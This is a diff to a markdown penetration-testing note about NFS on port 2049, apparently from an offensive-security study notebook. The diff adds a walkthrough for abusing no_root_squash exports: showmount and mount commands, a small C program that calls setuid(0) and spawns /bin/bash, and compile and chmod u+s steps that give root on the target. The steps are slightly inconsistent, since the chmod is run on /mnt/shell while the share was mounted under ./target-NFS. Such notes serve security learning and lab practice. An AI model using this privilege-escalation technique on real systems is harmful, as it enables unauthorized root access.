@@ -10,7 +10,6 @@ tags:
   - NFS
   - Network File System
 ---
-
 # Port 2049 -  NFS Network File System
 
 Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. [NFS](https://en.wikipedia.org/wiki/Network_File_System) is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. 
@@ -96,9 +95,96 @@ By default nfs server has root_squash option on, which makes client access nobod
 
 ## Attacking wrong configured NFS 
 
-It is important to note that if the `root_squash` option is set, we cannot edit the `backup.sh` file even as `root`.
+When an NFS volume is created, various options can be set:
 
-We can also use NFS for further escalation. For example, if we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the `SUID` of that user and then run the shell via the SSH user.
+| Option           | Description                                                                                                                                                                                                                                                                                   |
+| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `root_squash`    | If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set. |
+| `no_root_squash` | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.                                                                           |
+This configuration can be checked out in the `/etc/exports` file:
+
+```shell-session
+cat /etc/exports
+```
+
+Enumerate NFS shares in the target:
+
+```
+# From the attacking machine
+showmount -e $targetIP
+```
+
+Output:
+
+```
+Export list for 10.129.2.210:
+/tmp             *
+/var/nfs/general *
+```
+
+In the output, the wildcard (`*`) means that the NFS (Network File System) share is exported to all clients, meaning any system can mount the exported directories. 
+
+If we could access the target machine and check the `/etc/exports` we would see something similar to:
+
+```
+/var/nfs/general *(rw,no_root_squash)
+/tmp *(rw,no_root_squash)
+```
+
+Meaning that remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. 
+
+```
+# Mounting NFS Share in our attacking machine
+sudo su
+mkdir target-NFS
+mount -t nfs $ip:/ ./target-NFS/ -o nolock
+cd target-NFS
+tree .
+```
+
+Now, from the target host we will create a binary:
+
+```
+# We can create a shell from the target machine:
+nano shell.c
+```
+
+Content:
+
+```shell-session
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+int main(void)
+{
+  setuid(0); setgid(0); system("/bin/bash");
+}
+```
+
+And from the target machine, we generate the binary:
+
+```shell-session
+gcc shell.c -o shell
+```
+
+Now, going back to the attacker machine, where we are logged as root, we can copy that binary:
+
+```
+cp shell shell2
+```
+
+We now **adds the "setuid" (Set User ID) permission** to the `/mnt/shell` binary. 
+
+```shell-session
+chmod u+s /mnt/shell
+```
+
+Going back to the target machine, when we run the binary we will be root.
+
+
+We can also use NFS for lateral movement. For example, if we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the `SUID` of that user and then run the shell via the SSH user.
 
 
 ## More
